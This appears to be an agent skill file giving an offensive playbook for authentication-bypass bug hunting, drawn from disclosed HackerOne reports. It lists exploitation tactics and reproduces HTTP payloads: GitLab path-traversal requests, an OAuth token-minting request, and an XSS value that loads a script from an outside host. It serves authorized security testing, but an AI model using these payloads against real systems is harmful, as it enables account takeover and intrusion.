---
name: authentication-bypass
description: "Authentication Bypass offensive playbook from 178 disclosed HackerOne reports (31 critical, 42 high, 74 medium, 31 low). Use when hunting or reviewing authentication bypass. Triggers: authentication, access, attacker, password, allowed."
license: "For authorized security testing and education only."
---

# Authentication Bypass

> Distilled from **178** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

Reaching authenticated state without valid credentials  -  logic flaws in login/reset/2FA, token confusion, alternate channels, or missing checks on a critical step.

## Where to hunt

- Map every auth entry point: password login, SSO/OAuth, magic links, password reset, 2FA verify, remember-me.
- Look for state that is set too early (e.g. session marked authenticated before 2FA), or steps that can be skipped by requesting a later endpoint directly.
- Inspect reset tokens, OTPs, and JWTs for predictability, no expiry, or missing signature verification.

## Exploitation playbook

- Skip 2FA by calling the post-2FA endpoint directly with the half-authenticated session.
- Reuse/guess password-reset tokens; change the account email mid-reset; force `response=success` client-side checks.
- OAuth: swap `code`/`state`, redirect_uri manipulation, `id_token` with `alg:none` or wrong audience.

## Bypass techniques

- Response manipulation where the client trusts a `success:false` flag.
- Alternate path/channel: mobile API or legacy endpoint that lacks the check the web has.

## Impact & escalation

- Full account takeover; if the account is admin/support, mass takeover of downstream users.

## Remediation

- Enforce every auth step server-side, bind tokens to session+user, verify signatures and audiences, expire and single-use all tokens.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="import_url"

http://gitlab3.example.vm/test/ttt
------WebKitFormBoundaryTdc8IV2vpQMwv6jW
Content-Disposition: form-data; name="mirror"; filename=test.txt
Content-Type: image/jpg

true
------WebKitFormBoundaryTdc8IV2vpQMwv6jW--
```

### 2. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
POST /api/v4/projects/<project-id>/terraform/state/%2e%2e%2f%2e%2e%2fwikis%2fattachments?serial=1 HTTP/1.1
Host: gitlab3.example.vm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTdc8IV2vpQMwv6jW
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
Content-Length: 316

------WebKitFormBoundaryTdc8IV2vpQMwv6jW
```

### 3. [#1148364](https://hackerone.com/reports/1148364)  -  Mint Oauth2 access token for targeted user
*high, $5,580*

```http
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
Cookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWW…
Content-Length: 223

code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
```

### 4. [#776684](https://hackerone.com/reports/776684)  -  [h1-415 2020] My writeup on how to retrieve the special secret docu…
*critical*

```http
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3x…

name=<script src="http://blakl.is/pwn.js"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

### 5. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…
```

### 6. [#1040786](https://hackerone.com/reports/1040786)  -  Exposure of a valid Gitlab-Workhorse JWT leading to various bad things
*high*

```http
GET /api/v4/projects/6/terraform/state/%2e%2e%2f%2e HTTP/1.1
Host: gitlab3.example.vm
Cookie: experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzBOVE14T1RWbUxXRTBZalF0TkRBek1pM…

'''
```

More payloads: see [payloads.md](payloads.md) (110 curated).

## Recurring patterns in this dataset

Most frequent terms across the 178 reports (term (count)): `authentication` (80), `access` (74), `attacker` (57), `password` (55), `allowed` (47), `email` (33), `discovered` (30), `login` (30), `unauthorized` (25), `victim` (23), `takeover` (23), `server` (20), `verification` (19), `token` (17), `code` (16), `otp` (16), `improper` (16), `reset` (16)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1328546](https://hackerone.com/reports/1328546) | critical | $15,000 | tiktok | Incorrect authorization to the intelbot service leading to ticket information |
| [#2443228](https://hackerone.com/reports/2443228) | critical | $12,000 | tiktok | Account Takeover via Authentication Bypass in TikTok Account Recovery |
| [#421859](https://hackerone.com/reports/421859) | critical | $3,000 | shopify | H1514 [*.(my)shopify.com] - Viewing Password Protected Content |
| [#990048](https://hackerone.com/reports/990048) | critical | $2,000 | eternal | Improper Validation at Partners Login |
| [#1380121](https://hackerone.com/reports/1380121) | critical | $1,500 | urbancompany | Critical full compromise of jarvis-new.urbanclap.com via weak session signing |
| [#921780](https://hackerone.com/reports/921780) | critical |  -  | snapchat | Improper Authentication - any user can login as other user with otp/logout & otp/login |
| [#1342088](https://hackerone.com/reports/1342088) | critical |  -  | flickr | Flickr Account Takeover using AWS Cognito API |
| [#1581240](https://hackerone.com/reports/1581240) | critical |  -  | stripe | Mass Account Takeover at https://app.taxjar.com/ - No user Interaction |

*See [reference.md](reference.md) for all 178 reports in this class.*
